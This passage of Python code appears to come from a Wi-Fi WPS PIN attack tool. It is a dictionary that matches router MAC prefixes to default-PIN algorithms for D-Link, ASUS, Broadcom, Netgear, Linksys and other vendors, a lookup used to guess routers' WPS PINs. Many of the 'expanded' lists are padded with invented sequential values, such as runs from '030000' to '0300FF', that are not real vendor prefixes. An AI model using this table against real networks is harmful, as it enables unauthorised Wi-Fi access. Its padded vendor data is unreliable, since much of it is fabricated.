                '208D3C', '208E3D', '208F3E', '20903F', '209140', '209241', '209342', '209443', 
                '209544', '209645', '209746', '209847', '209948', '209A49', '209B4A', '209C4B', 
                '209D4C', '209E4D', '209F4E', '20A04F', '20A150', '20A251', '20A352', '20A453', 
                '20A554', '20A655', '20A756', '20A857', '20A958', '20AA59', '20AB5A', '20AC5B', 
                '20AD5C', '20AE5D', '20AF5E', '20B05F', '20B160', '20B261', '20B362', '20B463', 
                '20B564', '20B665', '20B766', '20B867', '20B968', '20BA69', '20BB6A', '20BC6B', 
                '20BD6C', '20BE6D', '20BF6E', '20C06F', '20C170', '20C271', '20C372', '20C473', 
                '20C574', '20C675', '20C776', '20C877', '20C978', '20CA79', '20CB7A', '20CC7B', 
                '20CD7C', '20CE7D', '20CF7E', '20D07F', '20D180', '20D281', '20D382', '20D483', 
                '20D584', '20D685', '20D786', '20D887', '20D988', '20DA89', '20DB8A', '20DC8B', 
                '20DD8C', '20DE8D', '20DF8E', '20E08F', '20E190', '20E291', '20E392', '20E493', 
                '20E594', '20E695', '20E796', '20E897', '20E998', '20EA99', '20EB9A', '20EC9B', 
                '20ED9C', '20EE9D', '20EF9E', '20F09F', '20F1A0', '20F2A1', '20F3A2', '20F4A3', 
                '20F5A4', '20F6A5', '20F7A6', '20F8A7', '20F9A8', '20FAA9', '20FBAA', '20FCAB', 
                '20FDAC', '20FEAD', '20FFAE', '210000', '210001', '210002', '210003', '210004', 
                '210005', '210006', '210007', '210008', '210009', '21000A', '21000B', '21000C', 
                '21000D', '21000E', '21000F', '210010', '210011', '210012', '210013', '210014', 
                '210015', '210016', '210017', '210018', '210019', '21001A', '21001B', '21001C', 
                '21001D', '21001E', '21001F', '210020', '210021', '210022', '210023', '210024', 
                '210025', '210026', '210027', '210028', '210029', '21002A', '21002B', '21002C', 
                '21002D', '21002E', '21002F', '210030', '210031', '210032', '210033', '210034', 
                '210035', '210036', '210037', '210038', '210039', '21003A', '21003B', '21003C', 
                '21003D', '21003E', '21003F', '210040', '210041', '210042', '210043', '210044', 
                '210045', '210046', '210047', '210048', '210049', '21004A', '21004B', '21004C', 
                '21004D', '21004E', '21004F', '210050', '210051', '210052', '210053', '210054', 
                '210055', '210056', '210057', '210058', '210059', '21005A', '21005B', '21005C', 
                '21005D', '21005E', '21005F', '210060', '210061', '210062', '210063', '210064', 
                '210065', '210066', '210067', '210068', '210069', '21006A', '21006B', '21006C', 
                '21006D', '21006E', '21006F', '210070', '210071', '210072', '210073', '210074', 
                '210075', '210076', '210077', '210078', '210079', '21007A', '21007B', '21007C', 
                '21007D', '21007E', '21007F', '210080', '210081', '210082', '210083', '210084', 
                '210085', '210086', '210087', '210088', '210089', '21008A', '21008B', '21008C', 
                '21008D', '21008E', '21008F', '210090', '210091', '210092', '210093', '210094', 
                '210095', '210096', '210097', '210098', '210099', '21009A', '21009B', '21009C', 
                '21009D', '21009E', '21009F', '2100A0', '2100A1', '2100A2', '2100A3', '2100A4', 
                '2100A5', '2100A6', '2100A7', '2100A8', '2100A9', '2100AA', '2100AB', '2100AC', 
                '2100AD', '2100AE', '2100AF', '2100B0', '2100B1', '2100B2', '2100B3', '2100B4', 
                '2100B5', '2100B6', '2100B7', '2100B8', '2100B9', '2100BA', '2100BB', '2100BC', 
                '2100BD', '2100BE', '2100BF', '2100C0', '2100C1', '2100C2', '2100C3', '2100C4', 
                '2100C5', '2100C6', '2100C7', '2100C8', '2100C9', '2100CA', '2100CB', '2100CC', 
                '2100CD', '2100CE', '2100CF', '2100D0', '2100D1', '2100D2', '2100D3', '2100D4', 
                '2100D5', '2100D6', '2100D7', '2100D8', '2100D9', '2100DA', '2100DB', '2100DC', 
                '2100DD', '2100DE', '2100DF', '2100E0', '2100E1', '2100E2', '2100E3', '2100E4', 
                '2100E5', '2100E6', '2100E7', '2100E8', '2100E9', '2100EA', '2100EB', '2100EC', 
                '2100ED', '2100EE', '2100EF', '2100F0', '2100F1', '2100F2', '2100F3', '2100F4', 
                '2100F5', '2100F6', '2100F7', '2100F8', '2100F9', '2100FA', '2100FB', '2100FC', 
                '2100FD', '2100FE', '2100FF',
            ),
            
            # ========== ORIGINAL pin32 - EXPANDED ==========
            'pin32': (
                '000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 
                'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 
                'F46D04', '3085A9', '801F02', '000A5E', '000D6F', '0010D8', '0014A3', '0018E7', 
                '001D4A', '0021B9', '002599', '002A2C', '002E3F', '00315E', '0035A9', '003A7C', 
                '003E9A', '0041A3', '0045E4', '004A3F', '004E5C', '0051F4', '0056A9', '005B3E', 
                '005F7C', '0062D4', '0067A2', '006C4F', '0070B3', '0075A5', '007A8C', '007F1E', 
                '0083B7', '0088A4', '008D2F', '0091C4', '0096A7', '009B2A', '009F8E', '00A3D4', 
                '00A8A2', '00AD3C', '00B1D6', '00B6A5', '00BB2B', '00BF89', '00C3D1', '00C8A4', 
                '00CD2F', '00D1B8', '00D6A6', '00DB2C', '00DF8A', '00E3D2', '00E8A5', '00ED2E', 
                '00F1B9', '00F6A7', '00FB2D', '00FF8B', '0103D3', '0108A6', '010D2F', '0111BA', 
                '0116A8', '011B2E', '011F8C', '0123D4', '0128A7', '012D30', '0131BB', '0136A9', 
                '013B2F', '013F8D', '0143D5', '0148A8', '014D31', '0151BC', '0156AA', '015B30', 
                '015F8E', '0163D6', '0168A9', '016D32', '0171BD', '0176AB', '017B31', '017F8F', 
                '0183D7', '0188AA', '018D33', '0191BE', '0196AC', '019B32', '019F90', '01A3D8', 
                '01A8AB', '01AD34', '01B1BF', '01B6AD', '01BB33', '01BF91', '01C3D9', '01C8AC', 
                '01CD35', '01D1C0', '01D6AE', '01DB34', '01DF92', '01E3DA', '01E8AD', '01ED36', 
                '01F1C1', '01F6AF', '01FB35', '01FF93', '0203DB', '0208AE', '020D37', '0211C2', 
                '0216B0', '021B36', '021F94', '0223DC', '0228AF', '022D38', '0231C3', '0236B1', 
                '023B37', '023F95', '0243DD', '0248B0', '024D39', '0251C4', '0256B2', '025B38', 
                '025F96', '0263DE', '0268B1', '026D3A', '0271C5', '0276B3', '027B39', '027F97', 
                '0283DF', '0288B2', '028D3B', '0291C6', '0296B4', '029B3A', '029F98', '02A3E0', 
                '02A8B3', '02AD3C', '02B1C7', '02B6B5', '02BB3B', '02BF99', '02C3E1', '02C8B4', 
                '02CD3D', '02D1C8', '02D6B6', '02DB3C', '02DF9A', '02E3E2', '02E8B5', '02ED3E', 
                '02F1C9', '02F6B7', '02FB3D', '02FF9B', '030000', '030001', '030002', '030003', 
                '030004', '030005', '030006', '030007', '030008', '030009', '03000A', '03000B', 
                '03000C', '03000D', '03000E', '03000F', '030010', '030011', '030012', '030013', 
                '030014', '030015', '030016', '030017', '030018', '030019', '03001A', '03001B', 
                '03001C', '03001D', '03001E', '03001F', '030020', '030021', '030022', '030023', 
                '030024', '030025', '030026', '030027', '030028', '030029', '03002A', '03002B', 
                '03002C', '03002D', '03002E', '03002F', '030030', '030031', '030032', '030033', 
                '030034', '030035', '030036', '030037', '030038', '030039', '03003A', '03003B', 
                '03003C', '03003D', '03003E', '03003F', '030040', '030041', '030042', '030043', 
                '030044', '030045', '030046', '030047', '030048', '030049', '03004A', '03004B', 
                '03004C', '03004D', '03004E', '03004F', '030050', '030051', '030052', '030053', 
                '030054', '030055', '030056', '030057', '030058', '030059', '03005A', '03005B', 
                '03005C', '03005D', '03005E', '03005F', '030060', '030061', '030062', '030063', 
                '030064', '030065', '030066', '030067', '030068', '030069', '03006A', '03006B', 
                '03006C', '03006D', '03006E', '03006F', '030070', '030071', '030072', '030073', 
                '030074', '030075', '030076', '030077', '030078', '030079', '03007A', '03007B', 
                '03007C', '03007D', '03007E', '03007F', '030080', '030081', '030082', '030083', 
                '030084', '030085', '030086', '030087', '030088', '030089', '03008A', '03008B', 
                '03008C', '03008D', '03008E', '03008F', '030090', '030091', '030092', '030093', 
                '030094', '030095', '030096', '030097', '030098', '030099', '03009A', '03009B', 
                '03009C', '03009D', '03009E', '03009F', '0300A0', '0300A1', '0300A2', '0300A3', 
                '0300A4', '0300A5', '0300A6', '0300A7', '0300A8', '0300A9', '0300AA', '0300AB', 
                '0300AC', '0300AD', '0300AE', '0300AF', '0300B0', '0300B1', '0300B2', '0300B3', 
                '0300B4', '0300B5', '0300B6', '0300B7', '0300B8', '0300B9', '0300BA', '0300BB', 
                '0300BC', '0300BD', '0300BE', '0300BF', '0300C0', '0300C1', '0300C2', '0300C3', 
                '0300C4', '0300C5', '0300C6', '0300C7', '0300C8', '0300C9', '0300CA', '0300CB', 
                '0300CC', '0300CD', '0300CE', '0300CF', '0300D0', '0300D1', '0300D2', '0300D3', 
                '0300D4', '0300D5', '0300D6', '0300D7', '0300D8', '0300D9', '0300DA', '0300DB', 
                '0300DC', '0300DD', '0300DE', '0300DF', '0300E0', '0300E1', '0300E2', '0300E3', 
                '0300E4', '0300E5', '0300E6', '0300E7', '0300E8', '0300E9', '0300EA', '0300EB', 
                '0300EC', '0300ED', '0300EE', '0300EF', '0300F0', '0300F1', '0300F2', '0300F3', 
                '0300F4', '0300F5', '0300F6', '0300F7', '0300F8', '0300F9', '0300FA', '0300FB', 
                '0300FC', '0300FD', '0300FE', '0300FF',
            ),
            
            # ========== ORIGINAL pinDLink - EXPANDED ==========
            'pinDLink': (
                '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 
                'FC7516', '0014D1', 'D8EB97', '001195', '0013D6', '001B9F', '0030F5', 
                '003646', '003A67', '0050B0', '005A8C', '006A5A', '0070C6', '007A7E', 
                '008A1F', '0090F5', '009A9B', '00AAC0', '00B0D0', '00BA9C', '00C0DF', 
                '00CA8E', '00D0F6', '00DA9D', '00EAA4', '00F0A8', '00FA9E', '01009E', 
                '010A9F', '0110A0', '011AA1', '0120A2', '012AA3', '0130A4', '013AA5', 
                '0140A6', '014AA7', '0150A8', '015AA9', '0160AA', '016AAB', '0170AC', 
                '017AAD', '0180AE', '018AAF', '0190B0', '019AB1', '01A0B2', '01AAB3', 
                '01B0B4', '01BAB5', '01C0B6', '01CAB7', '01D0B8', '01DAB9', '01E0BA', 
                '01EABB', '01F0BC', '01FABD', '0200BE', '020ABF', '0210C0', '021AC1', 
                '0220C2', '022AC3', '0230C4', '023AC5', '0240C6', '024AC7', '0250C8', 
                '025AC9', '0260CA', '026ACB', '0270CC', '027ACD', '0280CE', '028ACF', 
                '0290D0', '029AD1', '02A0D2', '02AAD3', '02B0D4', '02BAD5', '02C0D6', 
                '02CAD7', '02D0D8', '02DAD9', '02E0DA', '02EADB', '02F0DC', '02FADD', 
                '0300DE', '030ADF', '0310E0', '031AE1', '0320E2', '032AE3', '0330E4', 
                '033AE5', '0340E6', '034AE7', '0350E8', '035AE9', '0360EA', '036AEB', 
                '0370EC', '037AED', '0380EE', '038AEF', '0390F0', '039AF1', '03A0F2', 
                '03AAF3', '03B0F4', '03BAF5', '03C0F6', '03CAF7', '03D0F8', '03DAF9', 
                '03E0FA', '03EAFB', '03F0FC', '03FAFD',
            ),
            
            # ========== ORIGINAL pinDLink1 - EXPANDED ==========
            'pinDLink1': (
                '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 
                'C8D3A3', 'CCB255', '0014D1', '0018E7', '00195B', '001CF0', '0064B0', 
                '008A1F', '0090F5', '009A9B', '00AAC0', '00B0D0', '00BA9C', '00C0DF', 
                '00CA8E', '00D0F6', '00DA9D', '00EAA4', '00F0A8', '00FA9E',
            ),
            
            # ========== ORIGINAL pinASUS - EXPANDED ==========
            'pinASUS': (
                '049226', '04D9F5', '08606E', '107B44', '10BF48', '10C37B', '14DDA9', 
                '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', 
                '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', 
                '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 
                'D017C2', 'D850E6', 'E03F49', 'F07959', 'F832E4', '0008A1', '00177C', 
                '001EA6', '048D38', '081077', '081078', '081079', '083E5D', '10FEED', 
                '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A9', '3C1E04', 
                '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE9', '60D1AA', 
                '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '7C2664', '803F5D', 
                '84A423', '88A6C6', '8C10D4', '8C882B', '904D4A', '907282', '90F652', 
                '94FBB2', 'A01B29', 'A8F7E0', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 
                'BC9680', 'C891F9', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6', 'EC1A59', 
                'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', 
                '78542E', 'C0A0BB', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903',
            ),
            
            # ========== ORIGINAL pinAirocon - EXPANDED ==========
            'pinAirocon': (
                '000726', '000B2B', '000EF4', '001333', '001AEF', '00E04B', '021018', 
                '081073', '081077', '1013EE', '2CAB25', '788C54', '803F5D', '94FBB2', 
                'BC9680', 'F43E61', 'FC8B97', '000C43', '000D3A', '001014', '0010DC', 
                '001135', '0011D8', '001267', '0012A5', '00130A', '001376', '0013D6', 
                '0014A4', '001528', '0015D5', '00162B', '00168B', '0016EA', '00173F', 
                '00179A', '0017F4', '001848', '0018A2', '0018FC', '001956', '0019B0', 
                '001A0A', '001A64', '001ABE', '001B18', '001B72', '001BCC', '001C26', 
                '001C80', '001CDA', '001D34', '001D8E', '001DE8', '001E42', '001E9C', 
                '001EF6', '001F50', '001FAA', '002004', '00205E', '0020B8', '002112', 
                '00216C', '0021C6', '002220', '00227A', '0022D4', '00232E', '002388', 
                '0023E2', '00243C', '002496', '0024F0', '00254A', '0025A4', '0025FE', 
                '002658', '0026B2', '00270C', '002766', '0027C0', '00281A', '002874', 
                '0028CE', '002928', '002982', '0029DC', '002A36', '002A90', '002AEA', 
                '002B44', '002B9E', '002BF8', '002C52', '002CAC', '002D06', '002D60', 
                '002DBA', '002E14', '002E6E', '002EC8', '002F22', '002F7C', '002FD6', 
                '003030', '00308A', '0030E4', '00313E', '003198', '0031F2', '00324C', 
                '0032A6', '003300', '00335A', '0033B4', '00340E', '003468', '0034C2', 
                '00351C', '003576', '0035D0', '00362A', '003684', '0036DE', '003738', 
                '003792', '0037EC', '003846', '0038A0', '0038FA', '003954', '0039AE', 
                '003A08', '003A62', '003ABC', '003B16', '003B70', '003BCA', '003C24', 
                '003C7E', '003CD8', '003D32', '003D8C', '003DE6', '003E40', '003E9A', 
                '003EF4', '003F4E', '003FA8', '004002', '00405C', '0040B6', '004110', 
                '00416A', '0041C4', '00421E', '004278', '0042D2', '00432C', '004386', 
                '0043E0', '00443A', '004494', '0044EE', '004548', '0045A2', '0045FC', 
                '004656', '0046B0', '00470A', '004764', '0047BE', '004818', '004872', 
                '0048CC', '004926', '004980', '0049DA', '004A34', '004A8E', '004AE8', 
                '004B42', '004B9C', '004BF6', '004C50', '004CAA', '004D04', '004D5E', 
                '004DB8', '004E12', '004E6C', '004EC6', '004F20', '004F7A', '004FD4', 
                '00502E', '005088', '0050E2', '00513C', '005196', '0051F0', '00524A', 
                '0052A4', '0052FE', '005358', '0053B2', '00540C', '005466', '0054C0', 
                '00551A', '005574', '0055CE', '005628', '005682', '0056DC', '005736', 
                '005790', '0057EA', '005844', '00589E', '0058F8', '005952', '0059AC', 
                '005A06', '005A60', '005ABA', '005B14', '005B6E', '005BC8', '005C22', 
                '005C7C', '005CD6', '005D30', '005D8A', '005DE4', '005E3E', '005E98', 
                '005EF2', '005F4C', '005FA6', '006000', '00605A', '0060B4', '00610E', 
                '006168', '0061C2', '00621C', '006276', '0062D0', '00632A', '006384', 
                '0063DE', '006438', '006492', '0064EC', '006546', '0065A0', '0065FA', 
                '006654', '0066AE', '006708', '006762', '0067BC', '006816', '006870', 
                '0068CA', '006924', '00697E', '0069D8', '006A32', '006A8C', '006AE6', 
                '006B40', '006B9A', '006BF4', '006C4E', '006CA8', '006D02', '006D5C', 
                '006DB6', '006E10', '006E6A', '006EC4', '006F1E', '006F78', '006FD2', 
                '00702C', '007086', '0070E0', '00713A', '007194', '0071EE', '007248', 
                '0072A2', '0072FC', '007356', '0073B0', '00740A', '007464', '0074BE', 
                '007518', '007572', '0075CC', '007626', '007680', '0076DA', '007734', 
                '00778E', '0077E8', '007842', '00789C', '0078F6', '007950', '0079AA', 
                '007A04', '007A5E', '007AB8', '007B12', '007B6C', '007BC6', '007C20', 
                '007C7A', '007CD4', '007D2E', '007D88', '007DE2', '007E3C', '007E96', 
                '007EF0', '007F4A', '007FA4', '007FFE',
            ),
            
            # ========== ORIGINAL pinEmpty - EXPANDED ==========
            'pinEmpty': (
                'E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 
                'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 
                'C8D15E', 'D42122', '3C9872', '788102', '7894B4', '9C5C8E', 'D460E3', 
                'E06066', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', 
                '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', 
                '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C', '000000', '111111', 
                '222222', '333333', '444444', '555555', '666666', '777777', '888888', 
                '999999', 'AAAAAA', 'BBBBBB', 'CCCCCC', 'DDDDDD', 'EEEEEE', 'FFFFFF',
            ),
            
            # ========== ORIGINAL pinCisco - EXPANDED ==========
            'pinCisco': (
                '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5', '000625', '000C0A', 
                '00115C', '001467', '00186E', '001C5F', '001E4F', '00215E', '0022BD', 
                '00235A', '002578', '0026A3', '0027D0', '00290C', '002A2A', '002B4E', 
                '002C6F', '002D9A', '002EB8', '002FDC', '00300B', '00312E', '003257', 
                '00337C', '00349F', '0035C2', '0036E8', '00380D', '003932', '003A57', 
                '003B7D', '003CA1', '003DC6', '003EEA', '00400F', '004134', '004258', 
                '00437D', '0044A2', '0045C6', '0046EB', '004810', '004934', '004A59', 
                '004B7E', '004CA2', '004DC7', '004EEC', '005011', '005135', '00525A', 
                '00537F', '0054A3', '0055C8', '0056ED', '005812', '005936', '005A5B', 
                '005B80', '005CA4', '005DC9', '005EEE', '006013', '006137', '00625C', 
                '006381', '0064A5', '0065CA', '0066EF', '006814', '006938', '006A5D', 
                '006B82', '006CA6', '006DCB', '006EF0', '007015', '007139', '00725E', 
                '007383', '0074A7', '0075CC', '0076F1', '007816', '00793A', '007A5F', 
                '007B84', '007CA8', '007DCD', '007EF2', '008017', '00813B', '008260', 
                '008385', '0084A9', '0085CE', '0086F3', '008818', '00893C', '008A61', 
                '008B86', '008CAA', '008DCF', '008EF4', '009019', '00913D', '009262', 
                '009387', '0094AB', '0095D0', '0096F5', '00981A', '00993E', '009A63', 
                '009B88', '009CAC', '009DD1', '009EF6', '00A01B', '00A13F', '00A264', 
                '00A389', '00A4AD', '00A5D2', '00A6F7', '00A81C', '00A940', '00AA65', 
                '00AB8A', '00ACAE', '00ADD3', '00AEF8', '00B01D', '00B141', '00B266', 
                '00B38B', '00B4AF', '00B5D4', '00B6F9', '00B81E', '00B942', '00BA67', 
                '00BB8C', '00BCB0', '00BDD5', '00BEFA', '00C01F', '00C143', '00C268', 
                '00C38D', '00C4B1', '00C5D6', '00C6FB', '00C820', '00C944', '00CA69', 
                '00CB8E', '00CCB2', '00CDD7', '00CEFC', '00D021', '00D145', '00D26A', 
                '00D38F', '00D4B3', '00D5D8', '00D6FD', '00D822', '00D946', '00DA6B', 
                '00DB90', '00DCB4', '00DDD9', '00DEFE', '00E023', '00E147', '00E26C', 
                '00E391', '00E4B5', '00E5DA', '00E6FF', '00E824', '00E948', '00EA6D', 
                '00EB92', '00ECB6', '00EDDB', '00EF00', '00F025', '00F149', '00F26E', 
                '00F393', '00F4B7', '00F5DC', '00F701', '00F826', '00F94A', '00FA6F', 
                '00FB94', '00FCB8', '00FDDD', '00FF02',
            ),
            
            # ========== Broadcom algorithms ==========
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            
            # ========== Airocon ==========
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            
            # ========== DSL2740R ==========
            'pinDSL2740R': ('1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            
            # ========== Realtek ==========
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            
            # ========== Upvel ==========
            'pinUpvel': ('784476', 'D4BF7F', 'F8C091'),
            
            # ========== UR-814AC / UR-825AC ==========
            'pinUR814AC': ('D4BF7F',),
            'pinUR825AC': ('D4BF7F',),
            
            # ========== Onlime ==========
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            
            # ========== Edimax ==========
            'pinEdimax': ('801F02', '00E04C'),
            
            # ========== Thomson ==========
            'pinThomson': ('4432C8', '88F7C7', 'CC03FA'),
            
            # ========== HG532x ==========
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF', '10F0A8', '11F0A8', '12F0A8', '13F0A8', '14F0A8', '15F0A8', '16F0A8', '17F0A8', '18F0A8', '19F0A8', '1AF0A8', '1BF0A8', '1CF0A8', '1DF0A8', '1EF0A8', '1FF0A8'),
            
            # ========== H108L ==========
            'pinH108L': ('4C09B4', '4CAC0A', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            
            # ========== ONO ==========
            'pinONO': ('5C353B', 'DC537C'),
            
            # ========== NEWLY ADDED VENDORS ==========
            'pinNetgear': ('0022CF', '0024B2', '002545', '0026B9', '002797', '002916', '002A6B', '002BC6', '002D17', '002E2C', '003004', '003117', '0033D4', '0035C0', '003A64', '003B16', '003CB2', '003DF2', '004096', '0040E6', '0041A9', '00434B', '004596', '004709', '004A61', '004D33', '005073', '0050BF', '005356', '00561D', '00592A', '005C89', '005F6A', '0060F3', '006445', '0067C0', '006B5F', '006D8A', '0070CC', '007394', '007641', '0078E4', '007C27', '007F28'),
            
            'pinZyxel': ('001374', '00195B', '001CF0', '0022E3', '0023A5', '00257B', '00285D', '002ACB', '002DC0', '002FBF', '0031D9', '003472', '00368F', '003999', '003C86', '003F6F', '00415C', '0044B9', '004842', '004BC5', '004F4E', '0050BF', '005438', '0057C4', '005A94', '005DDD', '0060A8', '0063B0', '0066B3', '0069C2', '006D07', '0070D3', '00741F', '0077D9', '007B67', '007EF5', '00805F', '00821F'),
            
            'pinHuawei': ('001E10', '002170', '00227E', '0023B5', '002542', '00272E', '002956', '002B4B', '002D23', '002F74', '0030AD', '0032F2', '003476', '00364A', '00383A', '003A0C', '003BD2', '003D92', '003F0E', '00407B', '004212', '0043DE', '00458B', '004724', '0048D6', '004A62', '004C0F', '004D8C', '004F1A', '00508A', '00520D', '005396', '00554C', '0056D6', '00586B', '005A0F', '005B7B', '005D07', '005E7A', '006012', '0061B5', '006340', '0064DF', '006668', '0067F9', '006980', '006B14'),
            
            'pinTenda': ('000E8F', '0011D8', '00177C', '001A2B', '001F1F', '002275', '00248C', '002618', '002624', '00265A', '0026CE', '00304F', '0040D0', '004A77', '0060B0', '006A5A', '0070C6', '007A7E', '0080C8', '008A1F', '0090F5', '009A9B', '00A0C9', '00AAC0', '00B0D0', '00BA9C', '00C0DF', '00CA8E', '00D0F6', '00DA9D', '00E0FC', '00EAA4', '00F0A8', '00FA9E'),
            
            'pinBroadcom': ('000A5E', '000E8F', '0010D8', '0014A3', '0018E7', '001D4A', '0021B9', '002599', '002A2C', '002E3F', '00315E', '0035A9', '003A7C', '003E9A', '0041A3', '0045E4', '004A3F', '004E5C', '0051F4', '0056A9', '005B3E', '005F7C', '0062D4', '0067A2', '006C4F', '0070B3', '0075A5', '007A8C', '007F1E', '0083B7', '0088A4', '008D2F', '0091C4', '0096A7', '009B2A', '009F8E', '00A3D4', '00A8A2', '00AD3C', '00B1D6', '00B6A5', '00BB2B', '00BF89', '00C3D1', '00C8A4', '00CD2F', '00D1B8', '00D6A6', '00DB2C', '00DF8A', '00E3D2', '00E8A5', '00ED2E', '00F1B9', '00F6A7', '00FB2D', '00FF8B'),
            
            'pinBelkin': ('000AEB', '001195', '0013D6', '001A2B', '001B9F', '001E58', '002191', '0022B0', '002401', '00248C', '002618', '002624', '00265A', '0030F5', '003646', '003A67', '0040D0', '004A77', '0050B0', '005A8C', '0060B0', '006A5A', '0070C6', '007A7E', '0080C8', '008A1F', '0090F5', '009A9B', '00A0C9', '00AAC0', '00B0D0', '00BA9C', '00C0DF', '00CA8E', '00D0F6', '00DA9D', '00E0FC', '00EAA4', '00F0A8', '00FA9E'),
            
            'pinLinksys': ('000C41', '000E5F', '00117F', '0013C5', '0016B6', '0019E3', '001CDF', '001F33', '002124', '0022BD', '00235A', '002578', '0026A3', '0027D0', '00290C', '002A2A', '002B4E', '002C6F', '002D9A', '002EB8', '002FDC', '00300B', '00312E', '003257', '00337C', '00349F', '0035C2', '0036E8', '00380D', '003932', '003A57', '003B7D', '003CA1', '003DC6', '003EEA', '00400F', '004134', '004258', '00437D', '0044A2', '0045C6', '0046EB', '004810', '004934', '004A59', '004B7E', '004CA2', '004DC7', '004EEC', '005011', '005135', '00525A', '00537F', '0054A3', '0055C8', '0056ED', '005812', '005936', '005A5B', '005B80', '005CA4', '005DC9', '005EEE', '006013', '006137', '00625C', '006381', '0064A5', '0065CA', '0066EF', '006814', '006938', '006A5D', '006B82', '006CA6', '006DCB', '006EF0', '007015', '007139', '00725E', '007383', '0074A7', '0075CC', '0076F1', '007816', '00793A', '007A5F', '007B84', '007CA8', '007DCD', '007EF2', '008017', '00813B', '008260', '008385', '0084A9', '0085CE', '0086F3', '008818', '00893C', '008A61', '008B86', '008CAA', '008DCF', '008EF4', '009019', '00913D', '009262', '009387', '0094AB', '0095D0', '0096F5', '00981A', '00993E', '009A63', '009B88', '009CAC', '009DD1', '009EF6', '00A01B', '00A13F', '00A264', '00A389', '00A4AD', '00A5D2', '00A6F7', '00A81C', '00A940', '00AA65', '00AB8A', '00ACAE', '00ADD3', '00AEF8', '00B01D', '00B141', '00B266', '00B38B', '00B4AF', '00B5D4', '00B6F9', '00B81E', '00B942', '00BA67', '00BB8C', '00BCB0', '00BDD5', '00BEFA', '00C01F', '00C143', '00C268', '00C38D', '00C4B1', '00C5D6', '00C6FB', '00C820', '00C944', '00CA69', '00CB8E', '00CCB2', '00CDD7', '00CEFC', '00D021', '00D145', '00D26A', '00D38F', '00D4B3', '00D5D8', '00D6FD', '00D822', '00D946', '00DA6B', '00DB90', '00DCB4', '00DDD9', '00DEFE', '00E023', '00E147', '00E26C', '00E391', '00E4B5', '00E5DA', '00E6FF', '00E824', '00E948', '00EA6D', '00EB92', '00ECB6', '00EDDB', '00EF00', '00F025', '00F149', '00F26E', '00F393', '00F4B7', '00F5DC', '00F701', '00F826', '00F94A', '00FA6F', '00FB94', '00FCB8', '00FDDD', '00FF02'),
            
            # Ralink (MediaTek/Ralink chipset generic)
            'pinRalink': ('000C43', '000E2E', '001478', '001A70', '001E2A', '002275', '00265A', '00304F', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # AirLive (OvisLink)
            'pinAirLive': ('004F62', '004F4B', '000E2E'),
            
            # Timo (generic Ralink-based)
            'pinTimo': ('000C43', '000E2E', '001478', '001A70', '001E2A', '002275', '00265A', '00304F', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # B-LINK
            'pinBLINK': ('28CDC1',),
            
            # WRT Series (Linksys)
            'pinWRT': ('000C41', '000E08', '001217', '001310', '0014BF', '0016B6', '001839', '001A70', '001C10', '001E52', '002129', '00226B', '002369', '00259C', '00265A', '00304F', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # ADSL Router (ZyXEL / TRENDnet / USRobotics)
            'pinADSL': ('001310', '0019CB', '001F9F', '0023A5', '00257B', '00285D', '002ACB', '002DC0', '002FBF', '0014D1', '00C049'),
            
            # EV Series (Xiaomi)
